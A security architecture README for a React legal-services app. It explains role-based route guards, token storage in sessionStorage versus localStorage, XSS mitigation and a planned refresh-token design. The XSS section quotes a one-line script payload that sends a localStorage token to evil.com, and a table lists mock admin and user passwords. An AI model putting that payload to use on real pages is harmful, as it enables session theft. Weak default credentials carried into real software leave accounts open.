# SL-LMS — Routing & Authentication Security Architecture

> Production-grade security reference for the role-based protected routing system.

---

## 🏗 Architecture Overview

```
┌───────────────────────────────────────────────────────────────┐
│  BrowserRouter                                                │
│  ┌────────────────────────────────────────────────────────┐   │
│  │  AuthProvider  (hydrates session on mount)             │   │
│  │  ┌─────────────────────────────────────────────────┐   │   │
│  │  │  AppRoutes                                      │   │   │
│  │  │  ├─ / ──────────── PublicLayout (landing)       │   │   │
│  │  │  ├─ /login ─────── LoginPage (guest)            │   │   │
│  │  │  ├─ /register ──── RegisterPage (guest)         │   │   │
│  │  │  ├─ /dashboard/client ──┐                       │   │   │
│  │  │  ├─ /dashboard/lawyer ──┼─ ProtectedRoute       │   │   │
│  │  │  ├─ /dashboard/admin ───┘    └─ RoleRoute       │   │   │
│  │  │  │                               └─ Dashboard   │   │   │
│  │  │  └─ * ──────────── NotFound (404)               │   │   │
│  │  └─────────────────────────────────────────────────┘   │   │
│  └────────────────────────────────────────────────────────┘   │
└───────────────────────────────────────────────────────────────┘
```

---

## 🔐 Token Storage Strategy

### Current Implementation: `sessionStorage`

| Aspect | Detail |
|--------|--------|
| **Engine** | `sessionStorage` (tab-scoped) |
| **Access Token** | Stored per-tab, cleared on tab close |
| **Refresh Token** | Same engine (sessionStorage) |
| **User Payload** | JSON-serialized user object |
| **Abstraction** | `tokenStorage` utility — single point of change |

### Why NOT `localStorage`?

- `localStorage` persists across tabs and browser restarts.
- **Any JavaScript on the same origin** can read it — including XSS-injected scripts.
- If an attacker injects `<script>fetch('https://evil.com?t=' + localStorage.getItem('token'))</script>`, the JWT is exfiltrated.

### Why NOT a plain global variable?

- Global variables (e.g., `window.__TOKEN__`) are the most XSS-vulnerable storage.
- Any script can read/write them with zero friction.
- They don't survive page refresh, breaking user sessions.
- No isolation between tabs.

### ✅ Recommended Production Strategy

```
Access Token  → In-memory variable (React state)
Refresh Token → httpOnly, Secure, SameSite=Strict cookie
Session Init  → Silent /auth/refresh call on mount
```

**Benefits:**
- Access token is NEVER persisted to disk or accessible via `document.cookie`.
- Refresh token in httpOnly cookie is invisible to JavaScript entirely.
- Even a successful XSS attack cannot steal either token.
- The `tokenStorage` abstraction layer means migrating requires changing **one file**.

---

## 🛡 XSS Risk Explanation

### What is XSS?
Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into your application. This can happen via:
- User-generated content (comments, profiles)
- URL parameters rendered without sanitization
- Third-party scripts (analytics, ads)

### How it affects token storage:
1. XSS script runs in the user's browser, on your origin.
2. It can access `localStorage`, `sessionStorage`, cookies (non-httpOnly), and DOM.
3. The attacker reads the JWT and sends it to their server.
4. They now have full API access as the victim user.

### Mitigation layers in SL-LMS:
1. **React's default escaping** — JSX auto-escapes strings (prevents most stored XSS).
2. **No `dangerouslySetInnerHTML`** — we never render raw HTML.
3. **Content Security Policy (CSP)** — should be configured on the server.
4. **sessionStorage over localStorage** — limits exposure to active tab.
5. **Short-lived access tokens** — minimize damage window (implement with backend).

---

## 🔄 Refresh Token Architecture (Future)

```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Client   │────────▶│  /login  │────────▶│  Backend │
│  (React)  │         │          │         │          │
│           │◀────────│ Set-Cookie: │◀────────│ Issue:   │
│           │  httpOnly│ refresh   │         │ access + │
│           │  cookie  │ token     │         │ refresh  │
│           │         └──────────┘         └──────────┘
│           │
│  On mount: ───────▶ POST /auth/refresh ──────────────▶
│                      (cookie sent auto)
│  ◀──────────────── { accessToken: "..." } ◀──────────
│  Store in memory
└──────────┘
```

1. **Login** → Backend returns access token (in response body) + refresh token (in httpOnly cookie).
2. **Every API call** → Attach access token from memory via `Authorization: Bearer ...`.
3. **Token expires** → Interceptor catches 401, calls `/auth/refresh`.
4. **Refresh endpoint** → Reads httpOnly cookie, validates, returns new access token.
5. **Page refresh** → AuthContext mount calls `/auth/refresh` to restore session silently.

---

## ⚠️ Critical Warning: Route-Level Security ≠ Backend Security

> **Frontend route protection is a UX feature, NOT a security feature.**

Route guards (`ProtectedRoute`, `RoleRoute`) prevent users from accidentally accessing pages they shouldn't see. However:

- Any user can open DevTools and modify React state.
- Any user can call your API directly with `curl` or Postman.
- JavaScript can be modified at runtime.

### Therefore:
- **Every API endpoint MUST verify the JWT independently.**
- **Every API endpoint MUST check the user's role from the decoded token.**
- **Never trust `role` sent in request body — derive it from the token.**

```
Frontend Guards  → UX convenience (redirect wrong users)
Backend Guards   → Actual security (reject unauthorized requests)
```

Both layers are necessary. Neither alone is sufficient.

---

## 🚀 Future Scalability Notes

### Adding a New Role (e.g., `moderator`)

1. Add to `config/index.js`:
   ```js
   roles: { ..., MODERATOR: "moderator" }
   ```

2. Add dashboard path to `routeConfig.js`:
   ```js
   DASHBOARD_MODERATOR: "/dashboard/moderator"
   ```

3. Add to `DASHBOARD_ROUTES` and `ROLE_DASHBOARD_MAP`.

4. Create the dashboard page component.

5. Add route in `AppRoutes.jsx`:
   ```jsx
   <Route path={PATHS.DASHBOARD_MODERATOR + "/*"} element={
     <ProtectedRoute>
       <RoleRoute allowedRoles={[roles.MODERATOR]}>
         <DashboardLayout />
       </RoleRoute>
     </ProtectedRoute>
   }>
     <Route index element={<Lazy><ModeratorDashboard /></Lazy>} />
   </Route>
   ```

Total: ~15 minutes, zero architectural changes.

### Adding Dashboard Sub-pages

Just add child `<Route>` elements inside the existing dashboard `<Route>` wrapper. The `ProtectedRoute` + `RoleRoute` guards apply to all children automatically.

### Multi-language Routing

The `routeConfig.js` path constants can be prefixed:
```js
const locale = i18n.language; // "en" | "si" | "ta"
DASHBOARD_CLIENT: `/${locale}/dashboard/client`
```

### SSR-Ready Structure

- All route definitions are in `routeConfig.js` (data, not JSX).
- Components are lazy-loaded (compatible with React Server Components).
- No `window`/`document` access in route configuration.

### Microservices Integration

- `authService.js` is the sole API contact point for auth.
- Swap mock implementations for real `fetch`/`axios` calls.
- Token refresh interceptor can be added to `api.js`.

---

## 📋 Mock Login Credentials

| Role | Email | Password |
|------|-------|----------|
| Client | `test@example.com` | `Test1234` |
| Lawyer | `lawyer@example.com` | `Lawyer1234` |
| Admin | `admin@example.com` | `Admin1234` |

---

## 📁 File Reference

| File | Purpose |
|------|---------|
| `utils/tokenStorage.js` | Abstracted token persistence layer |
| `context/AuthContext.jsx` | Auth state, login/logout, session hydration |
| `routes/routeConfig.js` | Path constants, role mappings, route metadata |
| `routes/ProtectedRoute.jsx` | Authentication gate (redirects to /login) |
| `routes/RoleRoute.jsx` | Role gate (redirects to correct dashboard) |
| `routes/AppRoutes.jsx` | Full route tree with lazy loading |
| `pages/dashboard/ClientDashboard.jsx` | Client dashboard page |
| `pages/dashboard/LawyerDashboard.jsx` | Lawyer dashboard page |
| `pages/dashboard/AdminDashboard.jsx` | Admin dashboard page |
| `pages/NotFound.jsx` | 404 page |
